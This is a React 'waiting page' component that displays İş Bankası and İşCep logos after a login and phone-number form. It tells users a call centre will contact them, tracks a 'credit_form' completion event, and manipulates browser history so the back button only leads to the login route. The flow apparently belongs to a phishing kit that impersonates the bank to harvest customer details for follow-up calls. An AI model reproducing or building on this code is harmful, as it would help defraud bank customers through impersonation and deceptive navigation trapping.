/* global fbq */
import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import './App.css';

function WaitingPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const [isLoading, setIsLoading] = useState(false);
  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);

  useEffect(() => {
    const handleResize = () => setIsMobile(window.innerWidth <= 768);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  useEffect(() => {
    const isValidNavigation = location.state?.isValidNavigation && location.state?.from === '/telefon';
    const isCompleted = location.state?.isCompleted;

    if (!isValidNavigation) {
      if (isMobile) {
        setIsLoading(true);
        setTimeout(() => {
          window.history.replaceState(null, '', '/giris');
          navigate('/giris', { replace: true });
        }, 1500);
      } else {
        window.history.replaceState(null, '', '/giris');
        navigate('/giris', { replace: true });
      }
    } else if (isCompleted) {
      setIsLoading(false);
      if (typeof window !== 'undefined' && window.fbq) {
        fbq('track', 'CompleteRegistration', {
          content_name: 'form_submission_completed',
          content_category: 'credit_form',
        });
      }
      const handlePopState = () => {
        window.history.replaceState(null, '', '/giris');
        navigate('/giris', { replace: true });
      };
      window.history.pushState(null, '', '/giris');
      window.history.pushState(null, '', '/giris');
      window.addEventListener('popstate', handlePopState);
      return () => window.removeEventListener('popstate', handlePopState);
    }
  }, [location.state, navigate, isMobile]);

  if (isLoading && isMobile) {
    return (
      <div className="loading-overlay">
        <div className="loading-container">
          <img src="/isbank-logo.png" alt="İş Bankası Logo" className="loading-logo" />
          <p className="loading-text">Lütfen Bekleyin</p>
        </div>
      </div>
    );
  }

  return (
    <div className="container">
      <div className="bekleme-content">
        <img src="/iscep-logo.png" alt="İşCep Logo" className="bekleme-iscep-logo" />
        <img src="/isbank-logo.png" alt="İş Bankası Logo" className="bekleme-isbank-logo" />
        <p className="waiting-message">Talebiniz alınmıştır, çağrı merkezimiz tarafından 24 saat içinde iletişime geçilecektir.</p>
      </div>
    </div>
  );
}

export default WaitingPage;
